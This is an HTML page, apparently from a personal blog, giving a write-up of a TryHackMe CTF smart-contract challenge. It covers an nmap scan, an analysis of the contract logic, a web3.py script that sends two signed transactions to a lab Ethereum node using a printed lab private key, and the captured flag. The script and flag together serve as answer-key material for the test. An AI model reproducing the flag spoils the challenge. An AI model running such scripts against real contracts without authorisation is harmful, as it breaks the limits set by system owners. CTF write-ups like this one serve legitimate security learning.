@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://hello-robbie.github.io/industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Task 33 - Industrial Chain - Hello Robbie</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Task 33 - Industrial Chain";
+        var mkdocs_page_input_path = "industrial-intrusion-tryhackme/Task 33 - IndustrialChain.md";
+        var mkdocs_page_url = "/industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hello Robbie
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../resume/">Resume</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Blog</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/honeypots/">Why I Use Honeypots</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/webpaths/">Web App Default Paths</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Industrial Intrusion - TryHackMe CTF</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../Intro/">Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%206%20-%20OSINT2/">Task 6 - OSINT2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%208%20-%20Kaboom/">Task 8 - Kaboom</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%209%20-%20Brr%20v2/">Task 9 - Brr v2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2010%20-%20Brr%20v1/">Task 10 - Brr v1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2012%20-%20Poison/">Task 12 - Poison</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2013%20-%20Orcam/">Task 13 - Orcam</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2014%20-%20Backdoored%20Bus/">Task 14 - Backdoored Bus</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2015%20-%20Chess%20Industry/">Task 15 - Chess Industry</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2016%20-%20Under%20Construction/">Task 16 - Under Construction</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2017%20-%20Klay/">Task 17 - Klay</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2022%20-%20Rogue%20Poller/">Task 22 - Rogue Poller</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2024%20-%20Auth/">Task 24 - Auth</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2025%20-%20Access%20Granted/">Task 25 - Access Granted</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2028%20-%20Start/">Task 28 - Start</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2029%20-%20Industrial/">Task 29 - Industrial</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Task 33 - Industrial Chain</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#executive-summary">Executive Summary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance and Enumeration</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#11-port-scan-command">1.1 Port Scan Command</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#12-discovered-services">1.2 Discovered Services</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-2-contract-analysis">Phase 2: Contract Analysis</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#21-logic-discovery">2.1 Logic Discovery</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-3-exploitation-via-python-script">Phase 3: Exploitation via Python Script</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#31-exploit-script-executed-from-tryhackme-attackbox">3.1 Exploit Script (Executed from TryHackMe AttackBox)</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-4-mission-success-and-flag-retrieval">Phase 4: Mission Success and Flag Retrieval</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#summary">Summary</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/">Task 35 - Uninterrupted Problem Supply</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2036%20-%20Mechacore%20Monitoring%20System/">Task 36 - Mechacore Monitoring System</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hello Robbie</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Industrial Intrusion - TryHackMe CTF</li>
+      <li class="breadcrumb-item active">Task 33 - Industrial Chain</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="ics-security-assessment-industrialchain-writeup-task-33">ICS Security Assessment - IndustrialChain Writeup (Task 33)</h1>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>In this challenge, I was tasked with regaining manual control of a smart contract that had been sabotaged, leaving apparent control accessible while safety locks remained enforced. The objective was to analyze the smart contract logic and trigger the <code>isSolved()</code> function to return <code>true</code>. After a full reconnaissance and contract analysis, I identified the required function calls and used a signed Web3 script to override the enforced contract-level locks. Successful execution of the two key function calls completed the challenge and revealed the flag.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance and Enumeration</h2>
+<p>The operation began with a TCP port scan to identify exposed services on the target machine.</p>
+<h3 id="11-port-scan-command">1.1 Port Scan Command</h3>
+<pre><code class="language-bash">nmap -p- -sV 10.10.212.29
+</code></pre>
+<h3 id="12-discovered-services">1.2 Discovered Services</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>SSH</td>
+<td>OpenSSH 8.2p1 on Ubuntu</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>HTTP</td>
+<td>Likely challenge frontend</td>
+</tr>
+<tr>
+<td>8545/tcp</td>
+<td>unknown</td>
+<td>Ethereum JSON-RPC — smart contract interface</td>
+</tr>
+</tbody>
+</table>
+<p>The presence of port 8545 indicated a deployed blockchain backend, likely a local Ethereum node (Geth or Hardhat).</p>
+<hr />
+<h2 id="phase-2-contract-analysis">Phase 2: Contract Analysis</h2>
+<p>With the UI and RPC URL accessible, I examined the provided smart contract.</p>
+<h3 id="21-logic-discovery">2.1 Logic Discovery</h3>
+<p>The contract had the following relevant functions:</p>
+<ul>
+<li><code>engageMainSwitch()</code>: Sets a state variable <code>systemActivated</code> to <code>true</code></li>
+<li><code>pressOverrideButton()</code>: Requires <code>systemActivated</code> to be <code>true</code>, then sets <code>you_solved_it = true</code></li>
+<li><code>isSolved()</code>: Returns the value of <code>you_solved_it</code></li>
+</ul>
+<p>The contract was designed to require both functions to be executed in order: first to activate the system, then to override the safety lock.</p>
+<hr />
+<h2 id="phase-3-exploitation-via-python-script">Phase 3: Exploitation via Python Script</h2>
+<p>After confirming the wallet had sufficient funds and verifying the correct contract address, I crafted a Python script using <code>web3.py</code> to send two signed transactions in sequence.</p>
+<h3 id="31-exploit-script-executed-from-tryhackme-attackbox">3.1 Exploit Script (Executed from TryHackMe AttackBox)</h3>
+<pre><code class="language-python">from web3 import Web3
+
+w3 = Web3(Web3.HTTPProvider(&quot;http://10.10.212.29:8545&quot;))
+acct = w3.eth.account.from_key(&quot;0xcbc81654d8dac9cda05b8a5807ce0b4b9c87287b967ab816f38bae4f1e4cea68&quot;)
+contract_address = Web3.to_checksum_address(&quot;0x74dae0A0e456C8556525c7f16fB07CD9c25b2127&quot;)
+
+abi = [
+    {&quot;inputs&quot;:[],&quot;name&quot;:&quot;engageMainSwitch&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},
+    {&quot;inputs&quot;:[],&quot;name&quot;:&quot;pressOverrideButton&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},
+    {&quot;inputs&quot;:[],&quot;name&quot;:&quot;isSolved&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;}
+]
+
+contract = w3.eth.contract(address=contract_address, abi=abi)
+
+tx1 = contract.functions.engageMainSwitch().build_transaction({
+    &quot;from&quot;: acct.address,
+    &quot;nonce&quot;: w3.eth.get_transaction_count(acct.address),
+    &quot;gas&quot;: 200000,
+    &quot;gasPrice&quot;: w3.to_wei(&quot;1&quot;, &quot;gwei&quot;),
+    &quot;chainId&quot;: 31337
+})
+signed_tx1 = acct.sign_transaction(tx1)
+w3.eth.send_raw_transaction(signed_tx1['raw_transaction'])
+w3.eth.wait_for_transaction_receipt(signed_tx1['raw_transaction'])
+
+tx2 = contract.functions.pressOverrideButton().build_transaction({
+    &quot;from&quot;: acct.address,
+    &quot;nonce&quot;: w3.eth.get_transaction_count(acct.address),
+    &quot;gas&quot;: 200000,
+    &quot;gasPrice&quot;: w3.to_wei(&quot;1&quot;, &quot;gwei&quot;),
+    &quot;chainId&quot;: 31337
+})
+signed_tx2 = acct.sign_transaction(tx2)
+w3.eth.send_raw_transaction(signed_tx2['raw_transaction'])
+w3.eth.wait_for_transaction_receipt(signed_tx2['raw_transaction'])
+
+print(&quot;Solved:&quot;, contract.functions.isSolved().call())
+</code></pre>
+<p>The script returned:</p>
+<pre><code>Solved: True
+</code></pre>
+<p>indicating a successful override of the contract logic.</p>
+<hr />
+<h2 id="phase-4-mission-success-and-flag-retrieval">Phase 4: Mission Success and Flag Retrieval</h2>
+<p>After executing the correct sequence of transactions, I returned to the challenge interface and clicked <strong>“Get Flag”</strong>. The flag was revealed as:</p>
+<pre><code>THM{chain_command_granted_hardhat_switch}
+</code></pre>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>This smart contract challenge highlighted the importance of sequential logic and proper checks in blockchain environments. Even though the frontend appeared to show control, deeper analysis of the contract revealed that a hidden state variable (<code>systemActivated</code>) gated access to the final override. By understanding the logic and executing the calls programmatically, I was able to solve the challenge and retrieve the flag.</p>
+<p><strong>Recommendations:</strong></p>
+<ul>
+<li>Ensure state changes in smart contracts are visible and well-documented</li>
+<li>Avoid hidden logic dependencies that confuse users or admins</li>
+<li>Implement UI feedback tied directly to on-chain state for transparency</li>
+</ul>
+<p>This concludes the assessment of <strong>Task 33 - IndustrialChain</strong>.</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Task%2029%20-%20Industrial/" class="btn btn-neutral float-left" title="Task 29 - Industrial"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/" class="btn btn-neutral float-right" title="Task 35 - Uninterrupted Problem Supply">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Task%2029%20-%20Industrial/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
